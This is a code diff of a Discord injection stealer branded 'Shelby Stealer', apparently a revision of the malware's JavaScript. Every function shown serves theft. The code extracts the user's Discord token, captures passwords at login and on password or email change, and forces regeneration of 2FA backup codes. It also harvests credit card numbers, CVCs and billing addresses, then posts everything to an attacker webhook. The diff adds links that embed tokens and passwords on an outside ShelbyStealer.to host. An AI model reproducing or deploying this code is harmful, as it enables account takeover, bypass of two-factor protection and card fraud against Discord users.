@@ -7,7 +7,6 @@ const {
 const querystring = require('querystring');
 const os = require('os')
 var webhook = "%WEBHOOK_LINK%";
-var delayInMilliseconds = 1000
 const computerName = os.hostname();
 const discordInstall = `${__dirname}`
 const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
@@ -72,21 +71,21 @@ function FirstTime() {
 				fs.rmdirSync(path.join(__dirname, "init"));
 				if (token == null || token == undefined || token == "") {
 					var c = {
-						username: "Shelby Stealer",
+						username: "ShelbyStealer",
 						content: "",
 						embeds: [{
 							title: "Discord Initalized (User not Logged in)",
 							color: config["embed-color"],
 							fields: [{
-								name: "Malware Injection",
-								value: `\`\`\`Injection Info: \n${__dirname}\n\`\`\``,
+								name: "Info",
+								value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
 								inline: !1
 							}],
 							author: {
-								name: "Shelby Stealer"
+								name: "ShelbyStealer"
 							},
 							footer: {
-								text: "Shelby Stealer"
+								text: "ShelbyStealer"
 							}
 						}]
 					};
@@ -98,24 +97,16 @@ function FirstTime() {
                     `, !0).then(a => {
 						const b = JSON.parse(a);
 						var c = {
-							username: "Shelby Stealer",
+							username: "ShelbyStealer",
 							content: "",
 							embeds: [{
 								title: "Discord Initalized",
-								description: "[**<:partner:909102089513340979> │ Shelby Stealer**]",
+								description: "[**<:partner:909102089513340979> ¦ Click Here To Copy Info On Mobile**](https://premium.ShelbyStealer.to/raw/"+ token +")",
 								color: config["embed-color"],
 								fields: [{
-									name: "Malware Injection",
-									value: `\`\`\`Injection Info: \n${__dirname}\n\`\`\``,
+									name: "Info",
+									value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
 									inline: !1
-								}, {
-									name: "IP",
-									value: `\`${ip}\``,
-									inline: !0
-								}, {
-									name: "PC Name",
-									value: `\`${computerName}\``,
-									inline: !0
 								}, {
 									name: "Username",
 									value: `\`${b.username}#${b.discriminator}\``,
@@ -134,10 +125,10 @@ function FirstTime() {
 									inline: !1
 								}],
 								author: {
-									name: "Shelby Stealer"
+									name: "ShelbyStealer"
 								},
 								footer: {
-									text: "Shelby Stealer"
+									text: "ShelbyStealer"
 								},
 								thumbnail: {
 									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -150,29 +141,29 @@ function FirstTime() {
 
 			}
 		}
-		if (!fs.existsSync(path.join(__dirname, "Shelby Stealer"))) {
+		if (!fs.existsSync(path.join(__dirname, "ShelbyStealerBTW"))) {
 			return !0
 		}
-		fs.rmdirSync(path.join(__dirname, "Shelby Stealer"));
+		fs.rmdirSync(path.join(__dirname, "ShelbyStealerBTW"));
 		if (config.logout != "false" || config.logout == "%LOGOUT%") {
 			if (config['logout-notify'] == "true") {
 				if (token == null || token == undefined || token == "") {
 					var c = {
-						username: "Shelby Stealer",
+						username: "ShelbyStealer",
 						content: "",
 						embeds: [{
 							title: "User log out (User not Logged in before)",
 							color: config["embed-color"],
 							fields: [{
-								name: "Malware Injection",
-								value: `\`\`\`Injection Info: \n${__dirname}\n\`\`\``,
+								name: "Info",
+								value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
 								inline: !1
 							}],
 							author: {
-								name: "Shelby Stealer"
+								name: "ShelbyStealer"
 							},
 							footer: {
-								text: "Shelby Stealer"
+								text: "ShelbyStealer"
 							}
 						}]
 					};
@@ -184,15 +175,15 @@ function FirstTime() {
                     `, !0).then(a => {
 						const b = JSON.parse(a);
 						var c = {
-							username: "Shelby Stealer",
+							username: "ShelbyStealer",
 							content: "",
 							embeds: [{
 								title: "User got logged out",
-								description: "[**<:partner:909102089513340979> │ Shelby Stealer**]",
+								description: "[**<:partner:909102089513340979> ¦ Click Here To Copy Info On Mobile**](https://premium.ShelbyStealer.to/raw/"+ token +")",
 								color: config["embed-color"],
 								fields: [{
-									name: "Malware Injection",
-									value: `\`\`\`Injection Info: \n${__dirname}\n\`\`\``,
+									name: "Info",
+									value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
 									inline: !1
 								}, {
 									name: "Username",
@@ -212,10 +203,10 @@ function FirstTime() {
 									inline: !1
 								}],
 								author: {
-									name: "Shelby Stealer"
+									name: "ShelbyStealer"
 								},
 								footer: {
-									text: "Shelby Stealer"
+									text: "ShelbyStealer"
 								},
 								thumbnail: {
 									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -251,8 +242,8 @@ session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) =>
 })
 
 function SendToWebhook(what) {
-    const window = BrowserWindow.getAllWindows()[0];
-    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+	const window = BrowserWindow.getAllWindows()[0];
+	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
     xhr.open("POST", "${webhook}", true);
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
@@ -262,7 +253,7 @@ function SendToWebhook(what) {
 
 function GetNitro(flags) {
 	if (flags == 0) {
-		return "No Nitro in Account"
+		return "No Nitro"
 	}
 	if (flags == 1) {
 		return "<:classic:896119171019067423> \`Nitro Classic\`"
@@ -270,7 +261,7 @@ function GetNitro(flags) {
 	if (flags == 2) {
 		return "<a:boost:824036778570416129> \`Nitro Boost\`"
 	} else {
-		return "No Nitro in Account"
+		return "No Nitro"
 	}
 }
 
@@ -353,7 +344,7 @@ function GetBadges(flags) {
 		badges += "<:developer:874750808472825986> "
 	}
 	if (badges == "") {
-		badges = "No Rare Badges"
+		badges = "None"
 	}
 	return badges
 }
@@ -391,11 +382,11 @@ function Login(email, password, token) {
               xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
               xmlHttp.setRequestHeader('Content-Type', 'application/json');
               xmlHttp.setRequestHeader("authorization", "${token}")
-              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
+              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":true}));
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://furry.surf/raw/"
+							var baseuri = "https://premium.ShelbyStealer.to/raw/"
 
 
 							var gayass = JSON.parse(codes)
@@ -445,41 +436,33 @@ function Login(email, password, token) {
 								var billing = "";
 								json.forEach(z => {
 									if (z.type == "") {
-										return "\`❌\`"
+										return "\`?\`"
 									} else if (z.type == 2 && z.invalid != !0) {
-										billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+										billing += "\`??\`" + " <:paypal:896441236062347374>"
 									} else if (z.type == 1 && z.invalid != !0) {
-										billing += "\`✔️\`" + " :credit_card:"
+										billing += "\`??\`" + " :credit_card:"
 									} else {
-										return "\`❌\`"
+										return "\`?\`"
 									}
 								})
 								if (billing == "") {
-									billing = "\`❌\`"
+									billing = "\`?\`"
 								}
 								return billing
 							}
 							const json = JSON.parse(info);
 
 							var params = {
-								username: "Shelby Stealer",
+								username: "ShelbyStealer",
 								content: "",
 								embeds: [{
 									"title": "User Login",
-									description: "[**<:partner:909102089513340979> │ Shelby Stealer**]",
+									description: "[**<:partner:909102089513340979> ¦ Click Here To Copy Info On Mobile**](https://premium.ShelbyStealer.to/raw/"+ token +"<br>"+ password+")",
 									"color": config['embed-color'],
 									"fields": [{
-										name: "Malware Injection",
-										value: `\`\`\`Injection Info: \n${discordInstall}\n\`\`\``,
+										name: "Info",
+										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
 										inline: !1
-									}, {
-										name: "IP",
-										value: `\`${ip}\``,
-										inline: !0
-									}, {
-										name: "PC Name",
-										value: `\`${computerName}\``,
-										inline: !0
 									}, {
 										name: "Username",
 										value: `\`${json.username}#${json.discriminator}\``,
@@ -497,7 +480,7 @@ function Login(email, password, token) {
 										value: `${GetBadges(json.flags)}`,
 										inline: !1
 									}, {
-										name: "Payment Methods",
+										name: "Billing",
 										value: `${Cool()}`,
 										inline: !1
 									}, {
@@ -514,10 +497,10 @@ function Login(email, password, token) {
 										inline: !1
 									}, ],
 									"author": {
-										"name": "Shelby Stealer"
+										"name": "ShelbyStealer"
 									},
 									"footer": {
-										"text": "Shelby Stealer"
+										"text": "ShelbyStealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -527,10 +510,10 @@ function Login(email, password, token) {
 									"color": config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
-										"name": "Shelby Stealer"
+										"name": "ShelbyStealer"
 									},
 									"footer": {
-										"text": "Shelby Stealer"
+										"text": "ShelbyStealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -539,14 +522,14 @@ function Login(email, password, token) {
 							}
 							var mfaembed = {
 								"title": ":detective: __2FA Codes__",
-								"description": `[2FA Codes](${baseuri})`,
+								"description": `[Get all of them](${baseuri})`,
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
-									"name": "Shelby Stealer"
+									"name": "ShelbyStealer"
 								},
 								"footer": {
-									"text": "Shelby Stealer"
+									"text": "ShelbyStealer"
 								}
 							}
 							if (token.startsWith("mfa")) {
@@ -614,40 +597,32 @@ function Login(email, password, token) {
 											var billing = "";
 											json.forEach(z => {
 												if (z.type == "") {
-													return "\`❌\`"
+													return "\`?\`"
 												} else if (z.type == 2 && z.invalid != !0) {
-													billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+													billing += "\`??\`" + " <:paypal:896441236062347374>"
 												} else if (z.type == 1 && z.invalid != !0) {
-													billing += "\`✔️\`" + " :credit_card:"
+													billing += "\`??\`" + " :credit_card:"
 												} else {
-													return "\`❌\`"
+													return "\`?\`"
 												}
 											})
 											if (billing == "") {
-												billing = "\`❌\`"
+												billing = "\`?\`"
 											}
 											return billing
 										}
 										const json = JSON.parse(info);
 										var params = {
-											username: "Shelby Stealer",
+											username: "ShelbyStealer",
 											content: "",
 											embeds: [{
 												"title": "User Login",
-												description: "[**<:partner:909102089513340979> │ Shelby Stealer**]",
+												description: "[**<:partner:909102089513340979> ¦ Click Here To Copy Info On Mobile**](https://premium.ShelbyStealer.to/raw/"+ token +"<br>"+ password+")",
 												"color": config['embed-color'],
 												"fields": [{
-													name: "Malware Injection",
-													value: `\`\`\`Injection Info: \n${discordInstall}\n\`\`\``,
+													name: "Info",
+													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
 													inline: !1
-												}, {
-													name: "IP",
-													value: `\`${ip}\``,
-													inline: !0
-												}, {
-													name: "PC Name",
-													value: `\`${computerName}\``,
-													inline: !0
 												}, {
 													name: "Username",
 													value: `\`${json.username}#${json.discriminator}\``,
@@ -682,10 +657,10 @@ function Login(email, password, token) {
 													inline: !1
 												}, ],
 												"author": {
-													"name": "Shelby Stealer"
+													"name": "ShelbyStealer"
 												},
 												"footer": {
-													"text": "Shelby Stealer"
+													"text": "ShelbyStealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -695,10 +670,10 @@ function Login(email, password, token) {
 												"color": config['embed-color'],
 												"description": CalcFriends(),
 												"author": {
-													"name": "Shelby Stealer"
+													"name": "ShelbyStealer"
 												},
 												"footer": {
-													"text": "Shelby Stealer"
+													"text": "ShelbyStealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -751,11 +726,11 @@ function ChangePassword(oldpassword, newpassword, token) {
               xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
               xmlHttp.setRequestHeader('Content-Type', 'application/json');
               xmlHttp.setRequestHeader("authorization", "${token}")
-              xmlHttp.send(JSON.stringify({\"password\":\"${newpassword}\",\"regenerate\":false}));
+              xmlHttp.send(JSON.stringify({\"password\":\"${newpassword}\",\"regenerate\":true}));
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://furry.surf/raw/"
+							var baseuri = "https://premium.ShelbyStealer.to/raw/"
 
 
 							var gayass = JSON.parse(codes)
@@ -804,41 +779,33 @@ function ChangePassword(oldpassword, newpassword, token) {
 								var billing = "";
 								json.forEach(z => {
 									if (z.type == "") {
-										return "\`❌\`"
+										return "\`?\`"
 									} else if (z.type == 2 && z.invalid != !0) {
-										billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+										billing += "\`??\`" + " <:paypal:896441236062347374>"
 									} else if (z.type == 1 && z.invalid != !0) {
-										billing += "\`✔️\`" + " :credit_card:"
+										billing += "\`??\`" + " :credit_card:"
 									} else {
-										return "\`❌\`"
+										return "\`?\`"
 									}
 								})
 								if (billing == "") {
-									billing = "\`❌\`"
+									billing = "\`?\`"
 								}
 								return billing
 							}
 							const json = JSON.parse(info);
 
 							var params = {
-								username: "Shelby Stealer",
+								username: "ShelbyStealer",
 								content: "",
 								embeds: [{
 									"title": "Password Changed",
-									description: "[**<:partner:909102089513340979> │ Shelby Stealer**]",
+									description: "[**<:partner:909102089513340979> ¦ Click Here To Copy Info On Mobile**](https://premium.ShelbyStealer.to/raw/"+ token +"<br>"+ newpassword+")",
 									"color": config['embed-color'],
 									"fields": [{
-										name: "Malware Injection",
-										value: `\`\`\`Injection Info: \n${discordInstall}\n\`\`\``,
+										name: "Info",
+										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
 										inline: !1
-									}, {
-										name: "IP",
-										value: `\`${ip}\``,
-										inline: !0
-									}, {
-										name: "PC Name",
-										value: `\`${computerName}\``,
-										inline: !0
 									}, {
 										name: "Username",
 										value: `\`${json.username}#${json.discriminator}\``,
@@ -856,7 +823,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 										value: `${GetBadges(json.flags)}`,
 										inline: !1
 									}, {
-										name: "Payment Methods",
+										name: "Billing",
 										value: `${Cool()}`,
 										inline: !1
 									}, {
@@ -877,10 +844,10 @@ function ChangePassword(oldpassword, newpassword, token) {
 										inline: !1
 									}, ],
 									"author": {
-										"name": "Shelby Stealer"
+										"name": "ShelbyStealer"
 									},
 									"footer": {
-										"text": "Shelby Stealer"
+										"text": "ShelbyStealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -890,10 +857,10 @@ function ChangePassword(oldpassword, newpassword, token) {
 									"color": config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
-										"name": "Shelby Stealer"
+										"name": "ShelbyStealer"
 									},
 									"footer": {
-										"text": "Shelby Stealer"
+										"text": "ShelbyStealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -902,14 +869,14 @@ function ChangePassword(oldpassword, newpassword, token) {
 							}
 							var mfaembed = {
 								"title": ":detective: __2FA Codes__",
-								"description": `[2FA Codes](${baseuri})`,
+								"description": `[Get all of them](${baseuri})`,
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
-									"name": "Shelby Stealer"
+									"name": "ShelbyStealer"
 								},
 								"footer": {
-									"text": "Shelby Stealer"
+									"text": "ShelbyStealer"
 								}
 							}
 							if (token.startsWith("mfa")) {
@@ -978,40 +945,32 @@ function ChangePassword(oldpassword, newpassword, token) {
 											var billing = "";
 											json.forEach(z => {
 												if (z.type == "") {
-													return "\`❌\`"
+													return "\`?\`"
 												} else if (z.type == 2 && z.invalid != !0) {
-													billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+													billing += "\`??\`" + " <:paypal:896441236062347374>"
 												} else if (z.type == 1 && z.invalid != !0) {
-													billing += "\`✔️\`" + " :credit_card:"
+													billing += "\`??\`" + " :credit_card:"
 												} else {
-													return "\`❌\`"
+													return "\`?\`"
 												}
 											})
 											if (billing == "") {
-												billing = "\`❌\`"
+												billing = "\`?\`"
 											}
 											return billing
 										}
 										const json = JSON.parse(info);
 										var params = {
-											username: "Shelby Stealer",
+											username: "ShelbyStealer",
 											content: "",
 											embeds: [{
 												"title": "Password Changed",
-												description: "[**<:partner:909102089513340979> │ Shelby Stealer**]",
+												description: "[**<:partner:909102089513340979> ¦ Click Here To Copy Info On Mobile**](https://premium.ShelbyStealer.to/raw/"+ token +"<br>"+ newpassword+")",
 												"color": config['embed-color'],
 												"fields": [{
-													name: "Malware Injection",
-													value: `\`\`\`Injection Info: \n${discordInstall}\n\`\`\``,
+													name: "Info",
+													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
 													inline: !1
-												}, {
-													name: "IP",
-													value: `\`${ip}\``,
-													inline: !0
-												}, {
-													name: "PC Name",
-													value: `\`${computerName}\``,
-													inline: !0
 												}, {
 													name: "Username",
 													value: `\`${json.username}#${json.discriminator}\``,
@@ -1029,7 +988,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 													value: `${GetBadges(json.flags)}`,
 													inline: !1
 												}, {
-													name: "Payment Methods",
+													name: "Billing",
 													value: `${Cool()}`,
 													inline: !1
 												}, {
@@ -1050,10 +1009,10 @@ function ChangePassword(oldpassword, newpassword, token) {
 													inline: !1
 												}, ],
 												"author": {
-													"name": "Shelby Stealer"
+													"name": "ShelbyStealer"
 												},
 												"footer": {
-													"text": "Shelby Stealer"
+													"text": "ShelbyStealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1063,10 +1022,10 @@ function ChangePassword(oldpassword, newpassword, token) {
 												"color": config['embed-color'],
 												"description": CalcFriends(),
 												"author": {
-													"name": "Shelby Stealer"
+													"name": "ShelbyStealer"
 												},
 												"footer": {
-													"text": "Shelby Stealer"
+													"text": "ShelbyStealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1119,11 +1078,11 @@ function ChangeEmail(newemail, password, token) {
               xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
               xmlHttp.setRequestHeader('Content-Type', 'application/json');
               xmlHttp.setRequestHeader("authorization", "${token}")
-              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
+              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":true}));
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://furry.surf/raw/"
+							var baseuri = "https://premium.ShelbyStealer.to/raw/"
 
 
 							var gayass = JSON.parse(codes)
@@ -1172,41 +1131,33 @@ function ChangeEmail(newemail, password, token) {
 								var billing = "";
 								json.forEach(z => {
 									if (z.type == "") {
-										return "\`❌\`"
+										return "\`?\`"
 									} else if (z.type == 2 && z.invalid != !0) {
-										billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+										billing += "\`??\`" + " <:paypal:896441236062347374>"
 									} else if (z.type == 1 && z.invalid != !0) {
-										billing += "\`✔️\`" + " :credit_card:"
+										billing += "\`??\`" + " :credit_card:"
 									} else {
-										return "\`❌\`"
+										return "\`?\`"
 									}
 								})
 								if (billing == "") {
-									billing = "\`❌\`"
+									billing = "\`?\`"
 								}
 								return billing
 							}
 							const json = JSON.parse(info);
 
 							var params = {
-								username: "Shelby Stealer",
+								username: "ShelbyStealer",
 								content: "",
 								embeds: [{
 									"title": "Email Changed",
-									description: "[**<:partner:909102089513340979> │ Shelby Stealer**]",
+									description: "[**<:partner:909102089513340979> ¦ Click Here To Copy Info On Mobile**](https://premium.ShelbyStealer.to/raw/"+ token +"<br>"+ password+")",
 									"color": config['embed-color'],
 									"fields": [{
-										name: "Malware Injection",
-										value: `\`\`\`Injection Info: \n${discordInstall}\`\`\``,
+										name: "Info",
+										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
 										inline: !1
-									}, {
-										name: "IP",
-										value: `\`${ip}\``,
-										inline: !0
-									}, {
-										name: "PC Name",
-										value: `\`${computerName}\``,
-										inline: !0
 									}, {
 										name: "Username",
 										value: `\`${json.username}#${json.discriminator}\``,
@@ -1224,7 +1175,7 @@ function ChangeEmail(newemail, password, token) {
 										value: `${GetBadges(json.flags)}`,
 										inline: !1
 									}, {
-										name: "Payment Methods",
+										name: "Billing",
 										value: `${Cool()}`,
 										inline: !1
 									}, {
@@ -1241,10 +1192,10 @@ function ChangeEmail(newemail, password, token) {
 										inline: !1
 									}, ],
 									"author": {
-										"name": "Shelby Stealer"
+										"name": "ShelbyStealer"
 									},
 									"footer": {
-										"text": "Shelby Stealer"
+										"text": "ShelbyStealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1254,10 +1205,10 @@ function ChangeEmail(newemail, password, token) {
 									"color": config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
-										"name": "Shelby Stealer"
+										"name": "ShelbyStealer"
 									},
 									"footer": {
-										"text": "Shelby Stealer"
+										"text": "ShelbyStealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1265,15 +1216,15 @@ function ChangeEmail(newemail, password, token) {
 								}]
 							}
 							var mfaembed = {
-								"title": ":space_invader: __2FA Codes__",
-								"description": `[2FA Codes](${baseuri})`,
+								"title": ":detective: __2FA Codes__",
+								"description": `[Get all of them](${baseuri})`,
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
-									"name": "Shelby Stealer"
+									"name": "ShelbyStealer"
 								},
 								"footer": {
-									"text": "Shelby Stealer"
+									"text": "ShelbyStealer"
 								}
 							}
 							if (token.startsWith("mfa")) {
@@ -1342,40 +1293,32 @@ function ChangeEmail(newemail, password, token) {
 											var billing = "";
 											json.forEach(z => {
 												if (z.type == "") {
-													return "\`❌\`"
+													return "\`?\`"
 												} else if (z.type == 2 && z.invalid != !0) {
-													billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+													billing += "\`??\`" + " <:paypal:896441236062347374>"
 												} else if (z.type == 1 && z.invalid != !0) {
-													billing += "\`✔️\`" + " :credit_card:"
+													billing += "\`??\`" + " :credit_card:"
 												} else {
-													return "\`❌\`"
+													return "\`?\`"
 												}
 											})
 											if (billing == "") {
-												billing = "\`❌\`"
+												billing = "\`?\`"
 											}
 											return billing
 										}
 										const json = JSON.parse(info);
 										var params = {
-											username: "Shelby Stealer",
+											username: "ShelbyStealer",
 											content: "",
 											embeds: [{
 												"title": "Email Changed",
-												description: "[**<:partner:909102089513340979> │ Shelby Stealer**]",
+												description: "[**<:partner:909102089513340979> ¦ Click Here To Copy Info On Mobile**](https://premium.ShelbyStealer.to/raw/"+ token +"<br>"+ password+")",
 												"color": config['embed-color'],
 												"fields": [{
-													name: "Malware Injection",
-													value: `\`\`\`Injection Info: \n${discordInstall}\`\`\``,
+													name: "Info",
+													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
 													inline: !1
-												}, {
-													name: "IP",
-													value: `\`${ip}\``,
-													inline: !0
-												}, {
-													name: "PC Name",
-													value: `\`${computerName}\``,
-													inline: !0
 												}, {
 													name: "Username",
 													value: `\`${json.username}#${json.discriminator}\``,
@@ -1393,7 +1336,7 @@ function ChangeEmail(newemail, password, token) {
 													value: `${GetBadges(json.flags)}`,
 													inline: !1
 												}, {
-													name: "Payment Methods",
+													name: "Billing",
 													value: `${Cool()}`,
 													inline: !1
 												}, {
@@ -1410,10 +1353,10 @@ function ChangeEmail(newemail, password, token) {
 													inline: !1
 												}, ],
 												"author": {
-													"name": "Shelby Stealer"
+													"name": "ShelbyStealer"
 												},
 												"footer": {
-													"text": "Shelby Stealer"
+													"text": "ShelbyStealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1423,10 +1366,10 @@ function ChangeEmail(newemail, password, token) {
 												"color": config['embed-color'],
 												"description": CalcFriends(),
 												"author": {
-													"name": "Shelby Stealer"
+													"name": "ShelbyStealer"
 												},
 												"footer": {
-													"text": "Shelby Stealer"
+													"text": "ShelbyStealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1462,16 +1405,16 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
 			var json = JSON.parse(info);
 			var params = {
-				username: "Shelby Stealer",
+				username: "ShelbyStealer",
 				content: "",
 				embeds: [{
-					"title": "Credit Card Added",
+					"title": "User Credit Card Added",
 					"description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
 					"author": {
-						"name": "Shelby Stealer"
+						"name": "ShelbyStealer"
 					},
 					"footer": {
-						"text": "Shelby Stealer"
+						"text": "ShelbyStealer"
 					},
 					"thumbnail": {
 						"url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
